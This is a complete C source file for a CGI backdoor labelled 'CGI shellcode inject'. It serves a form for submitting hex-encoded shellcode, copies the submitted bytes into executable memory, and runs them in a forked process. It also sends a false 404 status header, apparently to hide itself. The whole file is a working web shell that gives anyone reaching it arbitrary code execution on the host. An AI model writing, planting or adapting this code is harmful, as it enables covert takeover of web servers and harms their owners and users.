// gcc cgi-shellcode.c -o cgi-shellcode.cgi

#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>

#define die(x...) do { \
    fprintf(stderr, x); \
    exit(1); \
} while(0);

const char *html =
    "<html>\n"
    " <head>\n"
    "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
    "  <title>CGI shellcode inject</title>\n"
    " <style>\n"
    ".ta {\n"
    " width: 100%;\n"
    " height:100px;\n"
    " border:2px dashed #000;\n"
    " display: block;\n"
    "}\n"
    "\n"
    "#status {\n"
    " display: inline;\n"
    "}\n"
    "\n"
    ".bt {\n"
    " border-style: solid;\n"
    " border-color: black;\n"
    " padding: 3px;\n"
    "}\n"
    "\n"
    "body {\n"
    " font-family: monospace;\n"
    " max-width: 600px;\n"
    " padding: 20px;\n"
    "}\n"
    "\n"
    ".center {\n"
    " margin: 0 auto;\n"
    "}\n"
    "\n"
    "* {\n"
    " margin: 0;\n"
    " padding: 0;\n"
    "}\n"
    "\n"
    "h1 {\n"
    " font-size: 20px;\n"
    " margin: 20px;\n"
    "}\n"
    " </style>\n"
    " </head>\n"
    " <body class=\"center\">\n"
    "  <h1>CGI shellcode inject</h1>\n"
    "  <textarea id=\"sc\" class=\"ta\">\\x00\\x00\\x00\\x00\\x00</textarea>\n"
    "    <button type=\"button\" onclick=\"sendshellcode()\" class=\"bt\">Send Shellcode</button>\n"
    "  <div id=\"status\"></div>\n"
    "\n"
    " </body>\n"
    " <script>\n"
    "function sendshellcode(){\n"
    "  var shellcode = document.getElementById(\"sc\").value;\n"
    "  var status = document.getElementById(\"status\");\n"
    "  shellcode = shellcode.replace(/\\n/g, \"\");\n"
    "  shellcode = shellcode.replace(/ /g, \"\");\n"
    "\n"
    "  if(shellcode == \"\"){\n"
    "    status.innerHTML = 'Invalid !!!';\n"
    "    return;\n"
    "  }\n"
    "\n"
    "\n"
    "  var request = new XMLHttpRequest();\n"
    "\n"
    "  request.onreadystatechange = function(){\n"
    "    if(this.readyState == 4){\n"
    "      status.innerHTML = request.responseText;\n"
    "    }\n"
    "  };\n"
    "\n"
    "  request.open(\"POST\", window.location.href, true);\n"
    "  request.setRequestHeader(\"Content-type\",\"text/plain\");\n"
    "  request.send(shellcode);\n"
    "\n"
    "  status.innerHTML = 'Sent !!!';\n"
    "}\n"
    " </script>\n"
    "</html>\n";


const char *hello =
    "Status: 404 Not Found\r\n"
    "Content-type: text/html\r\n";

char hexdecode(char c){
    if(c >= '0' && c <= '9')
        c -= '0';

    else if(c >= 'a' && c <= 'f')
        c = c-'a'+10;

    else if(c >= 'A' && c <= 'F')
        c = c-'A'+10;

    return c;
}

char *create_shellcode(void){
    char *content_length, *aux, *page, *ret = NULL;
    char buf[1024], sc[256];
    size_t len, size, pos = 0;
    ssize_t n, i;

    if((content_length = getenv("CONTENT_LENGTH")) == NULL){
        die("CONTENT_LENGTH not set\n");
    }

    len = strtol(content_length, NULL ,10);
    size = len/4;

    page = mmap(0, size, PROT_EXEC|PROT_WRITE|PROT_READ,
        MAP_ANON|MAP_PRIVATE, -1, 0);

    if(page == MAP_FAILED){
        die("mmap failed\n");
    }

    while((n = read(STDIN_FILENO, buf, sizeof(buf))) > 0){
        if(n%4)
            goto end;

        aux = sc;

        for(i=0; i<n; i+=4){
            if(buf[i] != '\\')
                goto end;

            if(buf[i+1] != 'x')
                goto end;

            if(!isxdigit(buf[i+2]) || !isxdigit(buf[i+3]))
                goto end;

            *aux++ = (hexdecode(buf[i+2])*16)|hexdecode(buf[i+3]);
        }

        n = n/4;

        memcpy(page+pos, sc, n);
        pos += n;
    }

    ret = page;

    end:
    return ret;
}


int main(void){
    char *request_method, *sc;
    pid_t pid;

    puts(hello);

    if((request_method = getenv("REQUEST_METHOD")) == NULL){
        die("Unknown REQUEST_METHOD\n");
    }

    if(!strcmp(request_method, "POST")){
        if((sc = create_shellcode())){
            printf("OK");

            pid = fork();
            if(pid == 0){
                (*(void(*)())sc)();
                exit(0);
            }
        } else {
            printf("invalid shellcode\n");
        }
    }

    else if(!strcmp(request_method, "GET")){
        puts(html);
    }

    else {
        die("Method not allowed\n");
    }

    return 0;
}
